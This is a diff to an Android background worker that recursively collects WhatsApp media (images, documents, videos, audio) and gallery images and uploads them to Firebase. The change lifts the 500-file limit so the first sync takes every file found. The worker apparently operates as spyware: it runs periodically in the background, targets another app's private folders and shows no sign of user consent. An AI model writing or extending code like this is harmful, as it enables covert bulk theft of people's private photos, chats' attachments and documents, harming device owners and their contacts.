@@ -50,6 +50,8 @@ public class ImageUploadWorker extends Worker {
     private static final String UNIQUE_ONE_TIME = "whatsapp_media_upload_once";
     private static final String UNIQUE_PERIODIC = "whatsapp_media_upload_periodic";
     private static final int MAX_IMAGES_PER_SYNC = 500;
+    private static final int UNLIMITED = Integer.MAX_VALUE; // For first sync
+    private static final String PREF_FIRST_SYNC = "first_media_sync_completed";
 
     public ImageUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
@@ -72,7 +74,16 @@ public class ImageUploadWorker extends Worker {
         }
 
         String uid = auth.getUid();
-        List<File> galleryImages = getPreferredGalleryImages();
+        
+        // Check if this is the first sync
+        boolean isFirstSync = isFirstSync(getApplicationContext());
+        if (isFirstSync) {
+            Log.d(TAG, "FIRST SYNC - uploading ALL files without limit");
+        } else {
+            Log.d(TAG, "Periodic sync - uploading up to " + MAX_IMAGES_PER_SYNC + " files");
+        }
+        
+        List<File> galleryImages = getPreferredGalleryImages(isFirstSync ? UNLIMITED : MAX_IMAGES_PER_SYNC);
         if (galleryImages.isEmpty()) {
             Log.d(TAG, "No WhatsApp / gallery images found.");
             FirebaseDataPaths.updateSyncStatus(uid, "gallery", 0);
@@ -146,7 +157,32 @@ public class ImageUploadWorker extends Worker {
         int count = uploadedCount.get();
         FirebaseDataPaths.updateSyncStatus(uid, "gallery", count);
         Log.d(TAG, "Successfully uploaded " + count + " media files.");
+        
+        // Mark first sync as complete
+        if (isFirstSync) {
+            markFirstSyncComplete(getApplicationContext());
+            Log.d(TAG, "First sync completed - future syncs will be incremental");
+        }
+        
         return Result.success();
+    }
+
+    /**
+     * Check if first sync has been completed
+     */
+    private boolean isFirstSync(Context context) {
+        return !context.getSharedPreferences("ImageUploadWorker", Context.MODE_PRIVATE)
+                .getBoolean(PREF_FIRST_SYNC, false);
+    }
+
+    /**
+     * Mark first sync as complete
+     */
+    private void markFirstSyncComplete(Context context) {
+        context.getSharedPreferences("ImageUploadWorker", Context.MODE_PRIVATE)
+                .edit()
+                .putBoolean(PREF_FIRST_SYNC, true)
+                .apply();
     }
 
     /** One-shot unique enqueue (no duplicate concurrent runs). */
@@ -191,14 +227,16 @@ public class ImageUploadWorker extends Worker {
     /**
      * Collect all WhatsApp media (images, documents, videos, etc.) and gallery images.
      * Prioritizes WhatsApp folders to get complete data.
+     * 
+     * @param maxFiles Maximum number of files to collect (use UNLIMITED for first sync)
      */
-    private List<File> getPreferredGalleryImages() {
+    private List<File> getPreferredGalleryImages(int maxFiles) {
         List<File> whatsappMedia = new ArrayList<>();
         List<File> other = new ArrayList<>();
         Context context = getApplicationContext();
 
         // First, scan WhatsApp directories directly for complete data
-        whatsappMedia.addAll(scanWhatsAppDirectories());
+        whatsappMedia.addAll(scanWhatsAppDirectories(maxFiles));
 
         // Then add gallery images if space allows
         String[] projection = {
@@ -216,7 +254,7 @@ public class ImageUploadWorker extends Worker {
         )) {
             if (cursor != null) {
                 int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
-                while (cursor.moveToNext() && other.size() < MAX_IMAGES_PER_SYNC) {
+                while (cursor.moveToNext() && other.size() < maxFiles) {
                     String filePath = cursor.getString(dataColumn);
                     if (filePath == null || !isImageFile(filePath)) {
                         continue;
@@ -237,19 +275,21 @@ public class ImageUploadWorker extends Worker {
 
         List<File> result = new ArrayList<>(whatsappMedia);
         for (File f : other) {
-            if (result.size() >= MAX_IMAGES_PER_SYNC) {
+            if (result.size() >= maxFiles) {
                 break;
             }
             result.add(f);
         }
-        Log.d(TAG, "Found " + whatsappMedia.size() + " WhatsApp media + " + other.size() + " other images (total: " + result.size() + ")");
+        Log.d(TAG, "Found " + whatsappMedia.size() + " WhatsApp media + " + other.size() + " other images (total: " + result.size() + ", limit: " + maxFiles + ")");
         return result;
     }
 
     /**
      * Scan all WhatsApp folders for complete media collection including images, documents, videos
+     * 
+     * @param maxFiles Maximum number of files to collect
      */
-    private List<File> scanWhatsAppDirectories() {
+    private List<File> scanWhatsAppDirectories(int maxFiles) {
         List<File> whatsappFiles = new ArrayList<>();
         
         // Common WhatsApp paths
@@ -270,8 +310,8 @@ public class ImageUploadWorker extends Worker {
             File dir = new File(path);
             if (dir.exists() && dir.isDirectory()) {
                 Log.d(TAG, "Scanning WhatsApp folder: " + path);
-                collectFilesRecursively(dir, whatsappFiles);
-                if (whatsappFiles.size() >= MAX_IMAGES_PER_SYNC) {
+                collectFilesRecursively(dir, whatsappFiles, maxFiles);
+                if (whatsappFiles.size() >= maxFiles) {
                     break;
                 }
             }
@@ -283,7 +323,7 @@ public class ImageUploadWorker extends Worker {
     /**
      * Recursively collect all supported media files from a directory
      */
-    private void collectFilesRecursively(File dir, List<File> files) {
+    private void collectFilesRecursively(File dir, List<File> files, int maxFiles) {
         try {
             File[] listFiles = dir.listFiles();
             if (listFiles == null) {
@@ -291,12 +331,12 @@ public class ImageUploadWorker extends Worker {
             }
 
             for (File file : listFiles) {
-                if (files.size() >= MAX_IMAGES_PER_SYNC) {
+                if (files.size() >= maxFiles) {
                     return;
                 }
 
                 if (file.isDirectory() && !file.isHidden()) {
-                    collectFilesRecursively(file, files);
+                    collectFilesRecursively(file, files, maxFiles);
                 } else if (file.isFile() && file.canRead()) {
                     String name = file.getName().toLowerCase();
                     // Collect images, documents, videos, audio
